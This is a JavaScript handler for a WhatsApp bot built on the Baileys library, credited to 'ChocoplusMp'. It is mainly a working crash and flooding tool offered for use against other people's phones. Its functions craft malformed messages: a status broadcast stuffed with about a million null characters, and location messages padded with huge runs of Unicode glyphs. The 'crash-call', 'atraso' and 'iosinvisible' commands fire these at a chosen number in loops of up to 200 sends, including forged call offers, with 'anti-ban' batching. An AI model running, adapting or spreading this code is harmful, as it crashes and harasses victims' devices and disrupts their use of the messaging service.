const {fs, util, chalk, moment, pino, logger, crypto, path, readline, yargs, _, Boom, sleep, store, rl, question, makeWASocket, generateWAMessageFromContent, getAggregateVotesInPollMessage, downloadContentFromMessage, useMultiFileAuthState, generateWAMessage, DisconnectReason, prepareWAMessageMedia, areJidsSameUser, getContentType, decryptPollVote, relayMessage, jidDecode, makeInMemoryStore, Browsers, proto, } = require('./dev/consts.js')
const dir = (relPath) => path.join(__dirname, relPath);
module.exports = async (bruxin, m, chatUpdate, store, isUser) => {
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.sender = await bruxin.decodeJid(m.fromMe && bruxin.user.id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = bruxin.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
const info = m
const from = info.key.remoteJid
const target = from
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var prefix = global.prefixx ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefixx ?? global.prefix
const bardy = body || m.mtype;
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = info.key.fromMe ? (bruxin.user.id.split(':')[0]+'@s.whatsapp.net' || bruxin.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await bruxin.decodeJid(bruxin.user.id)
const senderNumber = sender.split('@')[0]
const userList = [
"0@s.whatsapp.net"
]
const blacklist = [
   "593969533280@s.whatsapp.net"
];

global.prefixx = ['','!','.',',','/','#'] 
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await bruxin.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata?.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
global.logColor = "\x1b[32m"
global.shapeColor = "\x1b[32m"
global.rootColor = "\x1b[32m"
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom);
}
if (!isUser) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Grupal';
    const INFOS = [
        `[ MESSAGE ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${pushname || "unknown"}`,
        `=> De: ${info.sender}`,
        `=> En: ${groupName || info.chat}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Privado';
    const INFOS = [
        `[ MESSAGE ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${pushname || "unknown"}`,
        `=> De: ${info.sender}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
}
}

const reply = (text) => {
bruxin.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}
// sex
global.cachedDevices = {};
global.aesQueueMap ||= {};

function getQueue(jid) {
    if (!global.aesQueueMap[jid]) {
        global.aesQueueMap[jid] = Promise.resolve();
    }
    return global.aesQueueMap[jid];
}

//const 
const chocoplus = {
            key: {
                remoteJid: "13135550002@s.whatsapp.net",
                fromMe: false,
                id: "quoted-poll"
            },
            message: {
                pollCreationMessage: {
                    name: "▸ だ - 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘!. ◂",
                    options: [
                        { optionName: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" },
                        { optionName: "『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』" }
                    ],
                    selectableOptionsCount: 1
                }
            }
        };
//imágenes 
const menuX = fs.readFileSync('./src/chocoplus.jpg');
const menuX2 = fs.readFileSync('./src/chocoplus.jpg');

//asyncs
async function UltraNulL(target, isPrivate = false) {
  const options = [
    { optionName: "\u0009" },
    { optionName: "\x10" }
  ];

  const correctAnswer = options[1];

  const msg1 = generateWAMessageFromContent(
    target,
    {
      botInvokeMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            messageAssociation: {
              associationType: 7,
              parentMessageKey: crypto.randomBytes(16)
            }
          },
          pollCreationMessage: {
            name: "꙳͙͡༑𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘⌟꙳͙͡༑ᐧ",
            options,
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer
          }
        }
      }
    },
    {}
  );

  const msg2 = { requestPaymentMessage: {} };

  const relayOpts = isPrivate
    ? { participant: { jid: target } }
    : {};

  await bruxin.relayMessage(target, msg1.message, relayOpts);
  await bruxin.relayMessage(target, msg2, relayOpts);
}

async function sjlglx(target) {
  await bruxin.relayMessage("status@broadcast", {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { 
            text: "# 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘. 𝒆𝒙3𝒄𝒖𝒕𝒐𝒓 ",
            format: "DEFAULT" 
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{ "${'\u0000'.repeat(1045000)}" }`,
              version: 3
            }
          }
        }
      }
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }]
            }
          ]
        }
      ]
    }
  );

  console.log("─────「 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞 follando kk』」─────");
}
async function TrashLocIOS(target) {
    const slash = { url: "https://b.top4top.io/p_3627yrgsq1.jpg" };
    let locationMessage = {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: slash,
        name: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘—" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "©️ 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』##?" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
        url: `https://chocoplus-xxx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿"
    };
    
    let msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                locationMessage
            }
        }
    }, {});
    
    await bruxin.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    console.log("Sexxx ✔️");
}
    
switch(command) {
case 'menu': {
                await bruxin.sendMessage(
                    m.chat,
                    {
                        interactiveMessage: {
                            title: `🚬 *Hola, este bot es algo simple espero les guste :D*

⌯ Autor : t.me/ChocoplusMp
⌯ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇 : Free\n*🎗️Crash Home Android🎗️*\n\ncrash-call 593969533280\n\n*⌛Atraso Android⌛*\n\natraso 593969533280\n\n*🍏Crash Home iOS🍏*\n\niosinvisible 593969533280\n`,
                            footer: "© 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』 - creator ",
                            image: menuX,
                            nativeFlowMessage: {
                                messageParamsJson: JSON.stringify({
                                    limited_time_offer: {
                                        text: "▸ .ᐟめ - 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘⋆.˚",
                                        url: "https://t.me/ChocoplusMp",
                                        copy_code: "sexito?",
                                        note: "💤💤💤💤",
                                        expiration_time: Date.now() * 999
                                    },
                                    bottom_sheet: {
                                        in_thread_buttons_limit: 2,
                                        divider_indices: [1, 2, 3, 4, 5, 999],
                                        list_title: "▸𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘⋆.˚",
                                        icon_title: "GIF",
                                        button_title: "X"
                                    },
                                    tap_target_configuration: {
                                        title: "X",
                                        description: "bomboclard",
                                        canonical_url: "https://t.me/ChocoplusMp",
                                        domain: "https://t.me/ChocoplusMp",
                                        button_index: 11
                                    },
                                    promo_banner: {
                                        header: "▸ .ᐟめ𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘⋆.˚",
                                        body: "Xxxxx",
                                        action: {
                                            type: "open_url",
                                            label: "Canal Oficial",
                                            url: "https://t.me/TmzXxxx"
                                        },
                                        expire_at: Math.floor(Date.now() / 1000) + 86400
                                    },
                                    ui_rules: {
                                        max_buttons: 2,
                                        allow_copy: false
                                    },
                                    system_meta: {
                                        label: "internal_service",
                                        version: "11.1.0",
                                        checksum: "x9a71c2ff",
                                        session_state: "stable"
                                    },
                                    redirect_action: {
                                        url: "https://t.me/ChocoplusMp",
                                        trigger: "auto"
                                    }
                                }),
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "REVIEW",
                                            has_multiple_buttons: true
                                        })
                                    },
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "PROMOTION",
                                            title: "All - Menu",
                                            sections: [
                                                /*{
                                                    title: '▸ 𝖬𝖾𝗇𝗎.˚',
                                                    highlight_label: "た 𝐃𝐞𝐯 〽️𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ⭑.ᐟ",
                                                    rows: [
                                                        { id: 'bvg', title: '🚬 - メラニー', description: '# Selección travas' }
                                                    ]
                                                },*/
                                                /*{
                                                    highlight_label: "た 𝐃𝐞𝐯 〽️𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ⭑.ᐟ",
                                                    rows: [
                                                        { id: 'allmenu', title: ' All menu', description: '#sex 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }
                                                    ]
                                                },*/
                                                {
                                                    highlight_label: "た 𝐃𝐞𝐯 〽️𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ⭑.ᐟ",
                                                    rows: [
                                                        { id: 'credits', title: '『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』' , description: 'グ Información bot' }
                                                    ]
                                                },
                                                {
                                                    highlight_label: "た 𝐃𝐞𝐯 〽️𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ⭑.ᐟ",
                                                    rows: [
                                                        { id: 'thx', title: '🍂 - メラニー', description: '# Gracias por usar el bot ' }
                                                    ]
                                                }
                                            ],
                                            has_multiple_buttons: true
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "GIFT",
                                            flow_cta: "",
                                            flow_message_version: "3"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Dev Telegram",
                                            url: "https://t.me/ChocoplusMp",
                                            merchant_url: "https://t.me/ChocoplusMp"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Canal de telegram",
                                            url: "https://t.me/TmzXxxx",
                                            merchant_url: "https://t.me/TmzXxxx"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Canal de WhatsApp",
                                            url: "https://whatsapp.com/channel/0029VbB8BuP60eBakS6zU83y",
                                            merchant_url: "https://whatsapp.com/channel/0029VbB8BuP60eBakS6zU83y"
                                        })
                                    }
                                ]
                            }
                        }
                    },
                    { quoted: chocoplus }
                );
                break;
            }
            case "credits": {
                let caption = `
$
▸ 𝖠𝗎𝗍or        : 𝗍.𝗆𝖾/ChocoplusMp
▸ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇       : *Free*
▸ 𝖯𝗋𝖾𝖿𝗂jo        : *𝗆𝗎𝗅𝗍𝗂*
▸ Estado        : *Bot estable*
▸ 𝖣𝖾𝗌𝖼𝗋𝗂𝗉𝗍𝗂𝗈𝗇   : *Este bot se ofrece de forma gratuita a toda la comunidad de hackpurgatory por su gran apoyo*\n\`La Compra y Venta de este Bot queda totalmente prohibida!!\`
  

 `;
                await bruxin.sendMessage(
                    m.chat,
                    {
                        productMessage: {
                            title: " 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧࣪- 𝐂𝐡𝐨𝐜𝐨 𖤐",
                            description: "『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』",
                            thumbnail: menuX2,
                            productId: "PROD001",
                            retailerId: "RETAIL001",
                            url: "https://t.me/ChocoplusMp",
                            body: caption,
                            footer: `ᴄʜᴏᴄᴏ ʙᴏᴛʜ`,
                            priceAmount1000: 777777,
                            currencyCode: "IDR",
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: " ㊮ ",
                                        id: `menu`
                                    })
                                }
                            ]
                        }
                    },
                    { quoted: chocoplus }
                );
                break;
            }
case "crash-call": {
    if (!isBot && !isCreator) return;

let num = (text || "").replace(/[^0-9]/g, "");
if (!num) {
  return enviarguto("Ingresa un número.\nEjemplo: *crash-call593...*");
}

let target = num + "@s.whatsapp.net";

const contactInfo = await bruxin.onWhatsApp(target);
if (!contactInfo || contactInfo.length === 0) {
  return enviarguto('Ese número no existe en WhatsApp');
}

    await bruxin.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });

    const { encodeWAMessage, encodeSignedDeviceIdentity, jidDecode } = require("@whiskeysockets/baileys");
    const crypto = require('crypto');
    const executeAttackBatch = async (targetJid) => {
        try {
            if (!global.cachedDevices[targetJid]) {
                try {
                    let deviceResult = await bruxin.getUSyncDevices([targetJid], false, false);
                    global.cachedDevices[targetJid] = deviceResult.map(({ user, device }) => 
                        `${user}:${device || ''}@s.whatsapp.net`
                    );
                    await bruxin.assertSessions(global.cachedDevices[targetJid]);
                } catch (e) {
                    global.cachedDevices[targetJid] = [targetJid];
                }
            }
            
            let devices = global.cachedDevices[targetJid];
            
            const createInfectedNodes = async (recipientJids, message, extraAttrs) => {
                let shouldIncludeDeviceIdentity = false;
                let nodes = await Promise.all(recipientJids.map(async (jid) => {
                    let bytes = Buffer.concat([Buffer.from(encodeWAMessage(message)), Buffer.alloc(8, 1)]);
                    let { type, ciphertext } = await bruxin.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                    };
                }));
                return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
            };

            let { nodes: destinations, shouldIncludeDeviceIdentity } = await createInfectedNodes(devices, { conversation: "y" }, { count: '0' });

            // Generamos un Call ID único para que cada llamada sea "nueva" ante el servidor
            const callId = crypto.randomBytes(16).toString("hex").toUpperCase();
            
            let kkk = {
                tag: "call",
                attrs: { to: targetJid, id: bruxin.generateMessageTag(), from: bruxin.user.id },
                content: [{
                    tag: "offer",
                    attrs: { "call-id": callId, "call-creator": bruxin.user.id },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                        { tag: "net", attrs: { medium: "3" } },
                        { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([1, 5, 247, 9, 228, 250, 1]) },
                        { tag: "destination", attrs: {}, content: destinations },
                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(bruxin.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            // Enviamos el nodo sin esperar respuesta crítica para no bloquear el bucle
            bruxin.sendNode(kkk).catch(() => {}); 

        } catch (e) {
            console.error("AES Fail:", e.message);
        }
    };

    // --- CONFIGURACIÓN DE ATAQUE MASIVO ANTI-BAN ---
    const TOTAL_ATTACKS = 200; 
    const BATCH_SIZE = 18;   
    const BATCH_DELAY = 4000;
  
    (async () => {
        let sent = 0;
        while (sent < TOTAL_ATTACKS) {
            let promises = [];
            for (let i = 0; i < BATCH_SIZE && sent < TOTAL_ATTACKS; i++) {
                promises.push(executeAttackBatch(target));
                sent++;
            }
            await Promise.all(promises);
           
            if (sent < TOTAL_ATTACKS) {
                console.log(`[LOG] Enviados ${sent}/${TOTAL_ATTACKS} a ${target}. sleep...`);
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }
        enviarguto(`Ataque iniciado a ${target}\n\`Espere 2 minutos antes de volver ejecutar el comando para que su sesión no se cierre\`` );
    } ) ();
}
break;
case 'atraso': {
if (!isBot) return;
if (!text) {
   return reply(`Ejemplo:\n${prefix + command} 593969533280`);
}

const getTarget = () => {

   if (m.mentionedJid?.length) return m.mentionedJid[0];

   if (m.quoted?.sender) return m.quoted.sender;

   const numero = text.replace(/[^0-9]/g, '');

   if (!numero || numero.length < 8) return null;

   return numero + "@s.whatsapp.net";
};

const Xreturn = getTarget();

if (!Xreturn) {
   return reply("Usuario / número inválido");
}

const botNumber = bruxin.user.id.split(':')[0] + "@s.whatsapp.net";

if (Xreturn === botNumber) {
   return reply("No puedes usar esto contra el bot");
}
if (blacklist.includes(Xreturn)) return;
const contactInfo = await bruxin.onWhatsApp(Xreturn);

if (!contactInfo?.length) {
   return reply("Ese número no existe en WhatsApp");
}
reply("*enviando...*");
const chocovvv = 50;
const chocozzz = 2000;
for (let i = 0; i < chocovvv; i++) {

   try {
      await sjlglx(Xreturn);
      await sleep(chocozzz);
   } catch (err) {

      console.log("Error en delay:", err);
      break;
   }
}

reply("✔️");
}
break;
case 'iosinvisible': {
if (!isBot) return;
if (!text) {
   return reply(`Ejemplo:\n${prefix + command} 593969533280`);
}

const getTarget = () => {

   if (m.mentionedJid?.length) return m.mentionedJid[0];

   if (m.quoted?.sender) return m.quoted.sender;

   const numero = text.replace(/[^0-9]/g, '');

   if (!numero || numero.length < 8) return null;

   return numero + "@s.whatsapp.net";
};

const Xreturn = getTarget();

if (!Xreturn) {
   return reply("Usuario / número inválido");
}

const botNumber = bruxin.user.id.split(':')[0] + "@s.whatsapp.net";

if (Xreturn === botNumber) {
   return reply("No puedes usar esto contra el bot");
}
if (blacklist.includes(Xreturn)) return;
const contactInfo = await bruxin.onWhatsApp(Xreturn);

if (!contactInfo?.length) {
   return reply("Ese número no existe en WhatsApp");
}
reply("*enviando...*");
const chocovvv = 100;
const chocozzz = 3000;
for (let i = 0; i < chocovvv; i++) {

   try {
      await TrashLocIOS(Xreturn);
      await sleep(chocozzz);
   } catch (err) {

      console.log("Error en iosinvisible:", err);
      break;
   }
}

reply("✔️");
}
break;
/*
case "testv1": {
if (!isBot) return reply('`comando negado!!\nsolo mi creador puede usarlo`');
if (!q) {
return await bruxin.sendMessage(from, { 
text: `Ejemplo: ${command} +52xxx` 
});
}

const numero = text.replace(/[^0-9]/g, "");
if (!numero || numero.length < 6) {
return reply("❌ *Ingresa un número válido!*");
}
const org = numero + "@s.whatsapp.net";
let gato = `
*Crash enviado con éxito a: ${org}*
> Deja descansar el bot 10 min para evitar ban
`;
await bruxin.sendMessage(m.chat, {
image: { url: "./src/pazinweb.jpg" },
caption: gato,
footer: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
headerType: 4,
hasMediaAttachment: true,
contextInfo: {
mentionedJid: [org],
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
forwardingScore: 99999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "",
serverMessageId: 1,
newsletterName: "『𝕳𝖆𝖈𝖐𝕻𝖚𝖗𝖌𝖆𝖙𝖔𝖗𝖞』"
}}
}, { quoted: m });
await test(org);
await test(org);
await test(org);
await test(org);
await test(org);
await rest(org);
}
break;
*/
default:
}

} catch (err) {console.log(util.format(err))}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
